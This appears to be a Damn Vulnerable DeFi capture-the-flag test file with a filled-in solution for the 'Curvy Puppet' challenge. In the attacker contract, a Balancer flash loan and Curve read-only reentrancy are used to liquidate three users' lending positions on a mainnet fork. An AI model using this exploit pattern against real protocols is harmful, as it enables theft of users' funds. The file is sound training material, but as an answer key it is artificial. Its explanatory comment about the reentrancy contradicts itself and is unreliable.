// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        /**
         * VULNERABILITY: Read-only reentrancy in Curve stETH/ETH pool
         * 
         * The get_virtual_price() function can be manipulated during the
         * callback when removing liquidity. When remove_liquidity is called,
         * the pool first updates internal balances, then sends ETH. During the
         * ETH send callback, get_virtual_price() returns an inflated value
         * because LP tokens are burned but balances haven't been updated yet.
         * 
         * Attack:
         * 1. Get WETH and LP tokens from treasury
         * 2. Add ETH liquidity to get more LP tokens
         * 3. Call remove_liquidity to trigger the reentrancy
         * 4. In the receive() callback, liquidate all positions (virtual_price is inflated)
         * 5. Return remaining assets to treasury
         */
        
        // Deploy attacker contract
        CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(
            lending,
            curvePool,
            weth,
            stETH,
            IERC20(curvePool.lp_token()),
            IERC20(address(dvt)),
            permit2,
            treasury,
            alice,
            bob,
            charlie
        );
        
        // Transfer treasury's assets to attacker
        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), TREASURY_LP_BALANCE);
        
        // Execute the attack
        attacker.attack();
        
        // Transfer rescued assets back to treasury
        attacker.cleanup();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

// Interface for Balancer flash loans (free!)
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract CurvyPuppetAttacker {
    CurvyPuppetLending public immutable lending;
    IStableSwap public immutable curvePool;
    WETH public immutable weth;
    IERC20 public immutable stETH;
    IERC20 public immutable lpToken;
    IERC20 public immutable dvt;
    IPermit2 public immutable permit2;
    address public immutable treasury;
    address public immutable alice;
    address public immutable bob;
    address public immutable charlie;
    
    // Balancer Vault on mainnet (fee-free flash loans)
    IBalancerVault constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    
    bool private attacking;
    
    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _curvePool,
        WETH _weth,
        IERC20 _stETH,
        IERC20 _lpToken,
        IERC20 _dvt,
        IPermit2 _permit2,
        address _treasury,
        address _alice,
        address _bob,
        address _charlie
    ) {
        lending = _lending;
        curvePool = _curvePool;
        weth = _weth;
        stETH = _stETH;
        lpToken = _lpToken;
        dvt = _dvt;
        permit2 = _permit2;
        treasury = _treasury;
        alice = _alice;
        bob = _bob;
        charlie = _charlie;
    }
    
    function attack() external {
        // Setup permit2 for liquidation first
        lpToken.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(lpToken),
            spender: address(lending),
            amount: uint160(10e18),
            expiration: uint48(block.timestamp + 1)
        });
        
        // Flash loan WETH from Balancer (fee-free)
        // Balancer vault has ~38k WETH, so we'll use 30k
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30000e18; // 30k WETH
        
        balancerVault.flashLoan(address(this), tokens, amounts, "");
    }
    
    // Balancer flash loan callback
    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        require(msg.sender == address(balancerVault), "Invalid caller");
        
        // Step 1: Unwrap all WETH to ETH
        uint256 wethBalance = weth.balanceOf(address(this));
        weth.withdraw(wethBalance);
        
        // Step 2: Add massive ETH liquidity to Curve pool to get LP tokens
        uint256 ethToAdd = address(this).balance;
        uint256[2] memory addAmounts = [ethToAdd, uint256(0)];
        curvePool.add_liquidity{value: ethToAdd}(addAmounts, 0);
        
        // Step 3: Remove liquidity using remove_liquidity_one_coin (ETH only)
        // This is where the reentrancy happens - during the ETH send, virtual_price is inflated
        attacking = true;
        uint256 lpBalance = lpToken.balanceOf(address(this));
        // Keep enough LP for liquidations (3 LP tokens needed)
        uint256 lpToRemove = lpBalance - 3e18;
        curvePool.remove_liquidity_one_coin(lpToRemove, 0, 0); // Remove as ETH (coin 0)
        attacking = false;
        
        // Step 4: Wrap ETH back to WETH to repay flash loan
        uint256 ethBalance = address(this).balance;
        weth.deposit{value: ethBalance}();
        
        // Repay flash loan (no fee for Balancer)
        weth.transfer(address(balancerVault), amounts[0]);
    }
    
    receive() external payable {
        // Only execute during the attack
        if (!attacking) return;
        
        // At this point, virtual_price should be inflated due to reentrancy
        // The pool's D is calculated with pre-removal balances but LP supply is reduced
        lending.liquidate(alice);
        lending.liquidate(bob);
        lending.liquidate(charlie);
    }
    
    function cleanup() external {
        // Transfer all DVT to treasury
        uint256 dvtBalance = dvt.balanceOf(address(this));
        if (dvtBalance > 0) {
            dvt.transfer(treasury, dvtBalance);
        }
        
        // Transfer remaining WETH to treasury
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            weth.deposit{value: ethBalance}();
        }
        uint256 wethBalance = weth.balanceOf(address(this));
        if (wethBalance > 0) {
            weth.transfer(treasury, wethBalance);
        }
        
        // Transfer remaining LP tokens to treasury
        uint256 lpBalance = lpToken.balanceOf(address(this));
        if (lpBalance > 0) {
            lpToken.transfer(treasury, lpBalance);
        }
        
        // Transfer any stETH to treasury
        uint256 stEthBalance = stETH.balanceOf(address(this));
        if (stEthBalance > 0) {
            stETH.transfer(treasury, stEthBalance);
        }
    }
}
